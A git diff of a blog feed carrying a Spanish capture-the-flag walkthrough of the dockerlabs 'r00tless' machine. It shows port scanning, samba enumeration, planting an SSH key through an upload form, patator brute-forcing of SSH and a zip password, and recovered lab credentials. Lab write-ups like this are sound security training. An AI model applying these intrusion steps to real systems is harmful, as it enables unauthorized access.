@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-09-03T00:10:38+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">r00tless</title><link href="/posts/r00tless/" rel="alternate" type="text/html" title="r00tless" /><published>2024-09-02T00:00:00+00:00</published><updated>2024-09-02T00:00:00+00:00</updated><id>/posts/r00tless</id><content type="html" xml:base="/posts/r00tless/"><![CDATA[<p><img src="/assets/images/r00tless/r00tless.png" alt="image" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-09-03T00:16:48+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">r00tless</title><link href="/posts/r00tless/" rel="alternate" type="text/html" title="r00tless" /><published>2024-09-02T00:00:00+00:00</published><updated>2024-09-02T00:00:00+00:00</updated><id>/posts/r00tless</id><content type="html" xml:base="/posts/r00tless/"><![CDATA[<p><img src="/assets/images/r00tless/r00tless.png" alt="image" /></p>
 
 <p>Estamos ante un docker que contiene una distribución Linux. Es de nivel difícil y es de la plataforma <a href="https://dockerlabs.es/">dockerlabs</a>.</p>
 
@@ -8,7 +8,7 @@
 
 <p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> y que use el modo agresivo <code class="language-plaintext highlighter-rouge">-T 4</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.18.0.2</code>:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-T</span> 4 <span class="nt">-v</span> 172.18.0.2
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-T</span> 4 <span class="nt">-v</span> 172.18.0.2
 PORT    STATE SERVICE
 22/tcp  open  ssh
 80/tcp  open  http
@@ -18,7 +18,7 @@ PORT    STATE SERVICE
 
 <p>Vemos que tiene los puertos <strong>22, 80, 139, 445</strong> abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,139,445 <span class="nt">-v</span> 172.18.0.2
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,139,445 <span class="nt">-v</span> 172.18.0.2
 PORT    STATE SERVICE     VERSION
 22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
 | ssh-hostkey: 
@@ -35,7 +35,7 @@ PORT    STATE SERVICE     VERSION
 
 <p>Enumeramos <strong>samba:</strong></p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux <span class="nt">-a</span> 172.18.0.2
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>enum4linux <span class="nt">-a</span> 172.18.0.2
 Sharename       Type      Comment
         <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
         print<span class="nv">$ </span>         Disk      Printer Drivers
@@ -52,14 +52,15 @@ S-1-22-1-1003 Unix User<span class="se">\p</span>asssamba <span class="o">(</spa
 
 <p>Ahora pasamos a enumerar el servicio web. Primero hacemos un ataque de fuerza bruta para encontrar directorios y ficheros:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feroxbuster <span class="nt">-u</span> http://172.18.0.2 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt <span class="nt">-r</span> <span class="nt">-d</span> 1 <span class="nt">-x</span> .php,.txt,.zip
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://172.18.0.2 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt <span class="nt">-r</span> <span class="nt">-d</span> 1 <span class="nt">-x</span> .php,.txt,.zip
 200      GET        1l       10w       56c http://172.18.0.2/upload.php
-200      GET       94l      183w     2410c http://172.18.0.2/200      GET        2l       16w       78c http://172.18.0.2/readme.txt
+200      GET       94l      183w     2410c http://172.18.0.2/
+200      GET        2l       16w       78c http://172.18.0.2/readme.txt
 </code></pre></div></div>
 
 <p>Llama la atención el fichero <strong>readme.txt</strong>. Lo vemos:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://172.18.0.2/readme.txt
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://172.18.0.2/readme.txt
 
 It may be that the file that is being uploaded is being uploaded <span class="k">in </span>a .ssh/?
 </code></pre></div></div>
@@ -67,10 +68,10 @@ It may be that the file that is being uploaded is being uploaded <span class="k"
 <p>Parece que la url <a href="http://172.18.0.2/upload.php"><strong>http://172.18.0.2/upload.php</strong></a> sube el fichero al directorio <strong>.ssh</strong> de alguno de los usuarios que hemos descubierto. Vamos a crear un par de claves públicas/privadas:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Creamos las claves</span>
-ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096
+<span class="nv">$ </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096
 
 <span class="c"># Creamos el fichero authorized_keys</span>
-<span class="nb">cat </span>id.pub <span class="o">&gt;</span> authorized_keys
+<span class="nv">$ </span><span class="nb">cat </span>id.pub <span class="o">&gt;</span> authorized_keys
 </code></pre></div></div>
 
 <p>Subimos el fichero <strong>authorized_keys:</strong></p>
@@ -79,7 +80,7 @@ ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096
 
 <p>No sabemos a que usuario pertenece el directorio <strong>.ssh.</strong> En este caso voy a usar el script <strong>patator</strong>. Primero creamos un fichero <strong>users.txt</strong> con los nombres de los usuarios que hemos descubierto y después ejecutamos el script:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patator ssh_login <span class="nv">host</span><span class="o">=</span>172.18.0.2 <span class="nv">user</span><span class="o">=</span>FILE0 <span class="nv">keyfile</span><span class="o">=</span><span class="nb">id </span><span class="nv">0</span><span class="o">=</span>users.txt
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator ssh_login <span class="nv">host</span><span class="o">=</span>172.18.0.2 <span class="nv">user</span><span class="o">=</span>FILE0 <span class="nv">keyfile</span><span class="o">=</span><span class="nb">id </span><span class="nv">0</span><span class="o">=</span>users.txt
 23:37:20 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
 23:37:20 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
 23:37:21 patator    INFO - 1     22     0.072 | root-false                         |     1 | Authentication failed.
@@ -93,7 +94,7 @@ ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096
 
 <p>Nos conectamos al sistema usando la clave privada:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> <span class="nb">id </span>passsamba@172.18.0.2
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> <span class="nb">id </span>passsamba@172.18.0.2
 Welcome to Ubuntu 24.04 LTS <span class="o">(</span>GNU/Linux 6.8.11-amd64 x86_64<span class="o">)</span>
 passsamba@64a2dd61671c:~<span class="err">$</span>
 </code></pre></div></div>
@@ -107,7 +108,7 @@ What would <span class="s2">"sambaarribasiempre"</span> be used <span class="k">
 
 <p>Veamos para que sirve… usando <strong>patator</strong> de nuevo:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patator ssh_login <span class="nv">host</span><span class="o">=</span>172.18.0.2 <span class="nv">user</span><span class="o">=</span>FILE0 <span class="nv">password</span><span class="o">=</span>sambaarribasiempre <span class="nv">0</span><span class="o">=</span>users.txt
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator ssh_login <span class="nv">host</span><span class="o">=</span>172.18.0.2 <span class="nv">user</span><span class="o">=</span>FILE0 <span class="nv">password</span><span class="o">=</span>sambaarribasiempre <span class="nv">0</span><span class="o">=</span>users.txt
 23:40:33 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
 23:40:33 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
 23:40:33 patator    INFO - 0     40     0.086 | sambauser                          |     2 | SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5
@@ -145,7 +146,7 @@ sambauser@64a2dd61671c:~<span class="nv">$ </span><span class="nb">cat</span> /s
 
 <p>Con <strong>patator</strong> y el módulo <strong>unzip_pass</strong> obtenemos la contraseña del fichero zip:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patator unzip_pass <span class="nv">zipfile</span><span class="o">=</span>secret.zip <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nt">-x</span> ignore:code!<span class="o">=</span>0
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator unzip_pass <span class="nv">zipfile</span><span class="o">=</span>secret.zip <span class="nv">password</span><span class="o">=</span>FILE0 <span class="nv">0</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nt">-x</span> ignore:code!<span class="o">=</span>0
 23:50:13 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
 23:50:13 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
 23:50:16 patator    INFO - 0     82     0.006 | qwert
@@ -161,7 +162,7 @@ root-false:cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ<span class="o">==</span>
 
 <p>Y desciframos la clave:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ=='</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ=='</span> | <span class="nb">base64</span> <span class="nt">-d</span>
 passwordbadsecureultra
 </code></pre></div></div>
 
@@ -241,7 +242,7 @@ total 16
 
 <p>Accedemos al fichero:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.11.5/ultramegatextosecret.txt
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root-false@64a2dd61671c:~<span class="nv">$ </span>curl http://10.10.11.5/ultramegatextosecret.txt
 
 En el reino de los hongos, se encontraba un lugar mágico y poco conocido: el Bosque de Nieve Eterna. Este bosque estaba cubierto de un manto blanco y brillante todo el año, y albergaba muchas criaturas fantásticas y secretos ocultos. Entre ellos, había una leyenda que hablaba de un pingüino muy especial que guardaba un gran secreto.
 
